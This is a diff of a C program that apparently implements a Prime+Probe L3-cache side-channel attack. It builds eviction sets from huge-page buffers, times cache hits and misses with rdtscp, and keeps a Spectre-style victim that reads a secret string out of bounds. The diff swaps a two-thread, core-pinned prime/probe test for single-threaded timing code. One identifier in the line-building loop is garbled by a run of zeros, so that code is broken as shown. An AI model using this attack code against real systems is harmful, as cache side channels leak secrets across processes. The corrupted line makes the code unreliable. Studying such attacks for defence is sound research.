@@ -1,4 +1,3 @@
-#define _GNU_SOURCE
 #include <stdio.h>
 #include <sys/mman.h>
 #include <stdint.h>
@@ -9,8 +8,6 @@
 #include <time.h>
 #include <string.h>
 #include <x86intrin.h>
-#include <sched.h>
-#include <pthread.h>
 
 int probe(char **set, int ss, char *candidate);
 void randomize_lines(char **ls, int s);
@@ -59,15 +56,6 @@ uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
 unsigned int array1_size = 16;
 char* secret = "The Magic Words are Squeamish Ossifrage.";
 int mix_shuffle[1000];
-int flag;
-int flag_p;
-
-char *lines[L3_LINES_NB];
-char *cset[L3_LINES_NB];
-// char *eset[L3_LINES_NB];
-// char *tset[L3_LINES_NB];
-// char *mset[L3_LINES_NB];
-int css = 0;//, ess = 0, tss = 0, mss = 0;
 
 void shuffle(int size)
 {
@@ -95,52 +83,40 @@ void victim_function(size_t x)
 }
 
 
-void prime_attack() {
-  // char **set, int ss, char *candidate
-
-
-//   uint64_t time;
-//   char **llp;
-//  // int count = 0, at = 0;
-//   int i;
-//   uintptr_t rip;
-//   if (ss > 0) {
-//     print_line(candidate, 0);
-//     printf(", ss 0x%x\n", ss);
-//   } else {
-//     return;
-//   }
-//   for (i = 0; i < L3_PROBE_PASSES; i++) {//16
-//     if (ss > 0) {
-//       __asm__ __volatile__("call asm_prime"
-//           : "=a"(time), "=c"(llp), "=d"(rip) : "a"(set), "b"(ss), "c"(candidate));
-//       // printf("Candidate access time %lu ", time);
-//     // if (time > L3_CACHE_MISS_THRESHOLD) {
-//     //     printf("M ");
-//     // } else {
-//     //     printf("H ");
-//     //   count++;
-//     // }
-//     // at += time;
-//     //   printf("\n");
-//       //    return time > L3_CACHE_MISS_THRESHOLD;
-//     }
-//   }
-//   // printf("hit count 0x%x, at %u average time, rip @0x%018lx\n", count, at /
-//   //     L3_PROBE_PASSES, rip);
-//   // printf("Last line pointer accessed @0x%016lx of list @0x%016lx\n",
-//   //     (uintptr_t)llp, (uintptr_t)set);
-//   // return count == 0;
-//   // return count > (L3_PROBE_PASSES >> 1);
-  // css=10;
-
-
-  shuffle(css);
-      for(int i=0;i<css;i++)
-      {
-       int mix_i=mix_shuffle[i];
-        *(cset[mix_i])=100;
-      }
+void prime_attack(char **set, int ss, char *candidate) {
+  uint64_t time;
+  char **llp;
+ // int count = 0, at = 0;
+  int i;
+  uintptr_t rip;
+  if (ss > 0) {
+    print_line(candidate, 0);
+    printf(", ss 0x%x\n", ss);
+  } else {
+    return;
+  }
+  for (i = 0; i < L3_PROBE_PASSES; i++) {//16
+    if (ss > 0) {
+      __asm__ __volatile__("call asm_prime"
+          : "=a"(time), "=c"(llp), "=d"(rip) : "a"(set), "b"(ss), "c"(candidate));
+      // printf("Candidate access time %lu ", time);
+    // if (time > L3_CACHE_MISS_THRESHOLD) {
+    //     printf("M ");
+    // } else {
+    //     printf("H ");
+    //   count++;
+    // }
+    // at += time;
+    //   printf("\n");
+      //    return time > L3_CACHE_MISS_THRESHOLD;
+    }
+  }
+  // printf("hit count 0x%x, at %u average time, rip @0x%018lx\n", count, at /
+  //     L3_PROBE_PASSES, rip);
+  // printf("Last line pointer accessed @0x%016lx of list @0x%016lx\n",
+  //     (uintptr_t)llp, (uintptr_t)set);
+  // return count == 0;
+  // return count > (L3_PROBE_PASSES >> 1);
 }
 
 int probe_attack(char **set, int ss, char *candidate) {
@@ -255,73 +231,34 @@ return count<L3_PROBE_PASSES;
 //   Target set 0x65e of 0x1000
 // Allocated pages @0x00007f3ccf600000 of size 0x08000000
 
-void test()
-{
-  cpu_set_t mask;
-	CPU_ZERO(&mask);
-	CPU_SET(2,&mask);
-	if(pthread_setaffinity_np(pthread_self(),sizeof(cpu_set_t),&mask)<0)
-	{
-		   perror("pthread_setaffinity_np");
-	}
-    while (flag_p != 1) {}
-	    flag_p = 0;
-   //prime_attack();
-    *(cset[0])=180;
-    flag=1;
-    printf("1\n");
-}
-
-void test1()
-{
-  cpu_set_t mask;
-	CPU_ZERO(&mask);
-	CPU_SET(1,&mask);
-	if(pthread_setaffinity_np(pthread_self(),sizeof(cpu_set_t),&mask)<0)
-	{
-		   perror("pthread_setaffinity_np");
-	}
-
-  register uint64_t time1, time2;
-  unsigned int ui;
-  int junk;
-
-  flag_p=1;
-  prime_attack();
-
-    	while (flag != 1) {}
-	    flag = 0;
-
-    	time1 = __rdtscp(&ui); /* READ TIMER */
-      *(cset[css-1])=100;
-			time2 = __rdtscp(&ui) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
-      printf("time:%d\n",time2);
-
-      if (time2 > L3_CACHE_MISS_THRESHOLD) {
-          printf("M ");
-      } else {
-          printf("H ");
-      }
-      printf("\n");
-    
-}
-
 int main(int argc, char *argv[]) {
-  cpu_set_t mask;
-  CPU_ZERO(&mask);
-  CPU_SET(0,&mask);
-  if(sched_setaffinity(0,sizeof(mask),&mask)<0)
-  {
-    perror("sched_setaffinity");
-  }
+  
   char **buf_list;
   int p, t, l, i;//,lc;
   uintptr_t pa, ta;
-
+  char *lines[L3_LINES_NB];
+  char *cset[L3_LINES_NB];
+  // char *eset[L3_LINES_NB];
+  // char *tset[L3_LINES_NB];
+  // char *mset[L3_LINES_NB];
+  int css = 0;//, ess = 0, tss = 0, mss = 0;
   time_t now;
 
   size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
+  // printf("Processor specification:\n"
+  //     "  Line width 0x%x\n"
+  //     "  Sets 0x%x\n"
+  //     "  Associativity 0x%x\n"
+  //     "  Total L3 cache size 0x%x\n",
+  //     L3_LINE_WIDTH, 1 << L3_SETS_WIDTH, L3_ASSOC, L3_CACHE_SIZE);
 
+  // printf("Algorithm parameters:\n"
+  //     "  Associativity factor 0x%x\n"
+  //     "  Searching eviction set in 0x%x lines\n"
+  //     "  Target set 0x%x of 0x%x\n",
+  //     1 << L3_FACTOR_WIDTH, L3_LINES_NB, L3_TARGET_SET, 1 << L3_SETS_WIDTH);
+
+  // Allocation of buffer
   buf = mmap(NULL, L3_BUF_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE |
       MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
 
@@ -333,18 +270,40 @@ int main(int argc, char *argv[]) {
   printf("Allocated pages @0x%016lx of size %d\n", (uintptr_t)buf,
       L3_BUF_SIZE);
 
-
+  /**
+   * First creating the cache lines
+   */
+  //probe的作用是讲待测的地址A1先读取一遍，然后将它之前的地址都读取一遍，存入缓存，再读取A1，如股票地址链的读入将A1祛除出去了，则最终的检测结果为Miss表示它的地址跟它之前的地址在同一个set中，冲突了，则不需要将其放入集合当中
+  // printf("(L3_BUF_SIZE >> L3_PD_OFFSET_WIDTH):0x%x\n",( (L3_BUF_SIZE >> L3_PD_OFFSET_WIDTH)));//64
+  // printf("L3_2MB_TAG_NB:0x%x\n",L3_2MB_TAG_NB);//8
+  // Iterate over the 2 MB pages  
+  //我们申请的buffer中有64页（L3_BUF_SIZE >> L3_PD_OFFSET_WIDTH），每个页有8个Tags
 
   for (p = 0; p < (L3_BUF_SIZE >> L3_PD_OFFSET_WIDTH); p++) {
     //|32---------------------21|20----18|17------12|11-------6|5--------0|
     //|---------------Frame number------------------|------Page offset----|  4KB Page
     //|----Large frame numer----|-----------Large page offset-------------|  2MB page
     //|---------------TAG----------------|------Set Index----|-Line offset|  Cache Line
-    pa = (uintptr_t)(buf + (p << L3_PD_OFFSET_WIDTH));
+    pa = (uintptr_t)(buf + (p << L3_PD_OFFSET_WIDTH));// pa:Page Address  L3_PD_OFFSET_WIDTH 21bit  large frame number +1
+    // printf("Page %d, @0x%016lx\n", p, pa);
+    // Iterating over available tags in the same 2MB page
+    //8
     for (t = 0; t < L3_2MB_TAG_NB; t++) {
       ta = pa | (t << (L3_LINE_WIDTH + L3_SETS_WIDTH));//tag address
-      lines[p * L3_2MB_TAG_NB + t] =
+     // printf("Tag (Lines) %d, @0x%016lx\n", t, ta);  //两个TAG之间相差2^18个cahce行（对内存而言）
+      // We add the line for the targeted set
+      // printf("p * L3_2MB_TAG_NB + t:%d, (char *)(ta | (L3_TARGET_SET << L3_LINE_WIDTH)):0x%x\n",p * L3_2MB_TAG_NB + t, (char *)(ta | (L3_TARGET_SET << L3_LINE_WIDTH)));
+      // printf("(L3_TARGET_SET << L3_LINE_WIDTH):%x\n",(L3_TARGET_SET << L3_LINE_WIDTH));
+      // printf("ta:%x\n",ta);
+      // printf("ta|offset:%x\n",(ta | (L3_TARGET_SET << L3_LINE_WIDTH)));
+      // printf("\n\n");
+      lines[p * L3_2MB_TA00000000000000000000000000000000000G_NB + t] =
           (char *)(ta | (L3_TARGET_SET << L3_LINE_WIDTH));//64*8行，64页，每个页8行
+      
+      // printf("ta|offset:%lx\n",(ta | (L3_TARGET_SET << L3_LINE_WIDTH)));
+      // printf("0x%016lx\n",lines[p * L3_2MB_TAG_NB + t]);
+
+          //|ta|00..00|空出了18个0与L3_TARGET_SET或以后就是set地址，目前不知道L3_TARGET_SET的0x65e是如何得出来的
     }
   }
 
@@ -355,15 +314,27 @@ int main(int argc, char *argv[]) {
   //  printf("Line %d @0x%016lx\n", l, (uintptr_t)lines[l]);
   }
 
+  /**
+   * Creating the eviction sets
+   */
 
+  // Set random number generator seed
   now = time(NULL);
   srand48(now);
 
+//  randomize_lines(&lines[0], L3_LINES_NB);
+
+  // XXX test buf list
+//  fill_buf_list(&buf_list, &lines[0], L3_LINES_NB);
+//  print_buf_list(buf_list, L3_LINES_NB);
+
+  // Step 1 : conflict set
   //L3_Line=512 page 64  每个page 8Line
   for (l = 0; l < L3_LINES_NB; l++) { //css:conflict set 数量  L3_LINES_NB
     printf("Line #0x%x  css:%d\n", l,css);
     fill_buf_list(&buf_list, &cset[0], css);
     // print_buf_list(buf_list, css);
+  //  printf("1111111111111111111\n");
     if (!probe(buf_list, css, lines[l])) {//如果hit则表示不冲突。
   //if(!probe_test(css,cset,lines[l])){
       printf("Add : non conflicting\n");
@@ -426,23 +397,48 @@ int main(int argc, char *argv[]) {
 
 printf("\ntesting......\n");
 
+	register uint64_t time1, time2;
+  unsigned int ui;
+  int junk;
+  // css=10;
+  shuffle(css);
+  *(cset[10])=100;
+      for(i=0;i<css;i++)
+      {
+       int mix_i=mix_shuffle[i];
+        *(cset[mix_i])=100;
+        // junk+= *(cset[i]);
+        //  printf("%d\n", *(cset[i]));
+      }
+*(cset[10])=220;
+*(cset[10])=210;
+*(cset[10])=120;
+*(cset[10])=12;
+*(cset[10])=20;
+*(cset[10])=23;
 
-  pthread_t pp_thread,pt_thread;
+    	time1 = __rdtscp(&ui); /* READ TIMER */
+			// junk = *addr; /* MEMORY ACCESS TO TIME */
+      junk=*(cset[10]);
+    //  *(cset[20])=107;
+			time2 = __rdtscp(&ui) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
+     //printf("%ld\n", (cset[10]));
+      //  printf("%d\n",*(cset[20]));
+      printf("time:%d\n",time2);
+      //现在实现的是访问过的能够hit，之后要做的是我们模仿受害者为其中某个cset赋值，再测试，只有它是miss的其他都hit
+  
+  // __asm__ __volatile__("call asm_attack"
+  //         : "=a"(time), "=c"(llp), "=d"(rip) : "a"(buf_list), "b"(css), "c"(cset[20]));
+  //     printf("Candidate access time %lu ", time);
 
-  // prime_attack();
-flag=0;
-flag_p=0;
-  if(pthread_create(&pp_thread,NULL,test,NULL)!=0)
-		{
-			perror("pthread_create");
-		}
-  if(pthread_create(&pt_thread,NULL,test1,NULL)!=0)
-		{
-			perror("pthread_create");
-		}
-
-pthread_join(pp_thread, NULL);
-pthread_join(pt_thread, NULL);
+    if (time2 > L3_CACHE_MISS_THRESHOLD) {
+        printf("M ");
+    } else {
+        printf("H ");
+      // count++;
+    }
+    printf("\n");
+    // at += time;
 
 
 
